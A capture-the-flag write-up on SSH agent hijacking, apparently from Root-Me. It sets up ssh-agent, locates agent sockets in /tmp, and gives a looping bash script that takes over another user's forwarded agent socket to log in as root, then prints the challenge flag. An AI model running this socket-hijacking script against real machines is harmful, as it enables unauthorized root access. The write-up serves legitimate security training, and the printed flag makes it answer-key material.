---
layout: default
title: SSH-Agent-Hijacking
---
When we logged in to the server, we can see every minute we get some message from our freind:

![[Pasted image 20260312140112.png]]

I tested the `user-agent`, and created one of my own, to see how it works.
First, You execute the next command:

```bash
admin@root-me:~$ eval "$(ssh-agent)"
Agent pid 5811
```

What it does is creating the `ssh-agent`, and also set the env variables, `SSH_AUTH_SOCK` and `SSH_AGENT_PID`. We got back the process id.

If we want to kill the `ssh-agent`, we can simply execute `ssh-agent -k`, or just kill the process directly: `kill 5811`.

If we want, we can add our ssh key to the `ssh-agent`:
```bash
ssh-add ~/.ssh/id_rsa
```

and then test it using `ssh-add -l`, which will print the fingerprint of the private key.

Okay, anyway, after creating the `ssh-agent`, we can see the socket file is located at `SSH_AUTH_SOCK`, and location is at `/tmp/ssh-*/agent.*:
```bash
admin@root-me:~$ eval "$(ssh-agent)"
Agent pid 5951
admin@root-me:~$ echo $SSH_AUTH_SOCK
/tmp/ssh-KQCjyFTmp8Mt/agent.5950
```

We can verify this is socket file:
```bash
admin@root-me:~$ ls -la /tmp/ssh-KQCjyFTmp8Mt/agent.5950
srw------- 1 admin admin 0 Mar 12 12:08 /tmp/ssh-KQCjyFTmp8Mt/agent.5950
```

The cool thing is that our friend is probably using too `user-agent` to login into our machine, so there is little window where we can take control over his socket file, and then login back into his machine.

We can find the hostname and username, which are `root@root-me`:

```bash
admin@root-me:~$ cat ~/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNZV0FeJX/PVNphoMLy2XDME1fJTL/FN+XX/+onpCt464JwA/LozkP/OL1oJCpQIKs1ntuQdttpyDRC2GSD/rAVTqQZ3m1PvBceK3nnE8blAN+gMY75mw41Kj5JuRh9xpK4JrBBYr1skDdq0z1/iI/JMDx0zv8IWkm1ZuIv7i+u9SP3j6Uzk9MxaGQLClvzjevhV0Kx0+Bkjrp2TMZKhzPrTnR7HplbFRAha0gwD1X/b1+igwWeynE4U0ZIl2QhtZ9BOGVlgYxfBS2YCbVL1TKxXj6qMNNvjs24Ve5l1INofYKhliq3dHZdL4fwW3ZzqoLsVh/89YfQpRsmKSmP6i5 root@root-me
```

Now, let's first kill all `user-agent`, to clear `/tmp/` from agent socket files.
Then, we can use this script, it search for sockets file, and if it finds, it uses it to login using the socket, back to our friend machine:

```bash
#!/bin/bash

while true
do
    for sock in /tmp/ssh-*/agent*
    do
        [ -S "$sock" ] || continue 
        echo "Found socket: $sock"
        export SSH_AUTH_SOCK="$sock"
        ssh root@root-me
    done
    sleep 1
done
```

![[Pasted image 20260312141847.png]]

```bash
root@root-me:~# cat .flag ;echo
B3_C4rR3fuLl_W1tH_SSH_F0RwArd_AGENT
```

the flag is **B3_C4rR3fuLl_W1tH_SSH_F0RwArd_AGENT**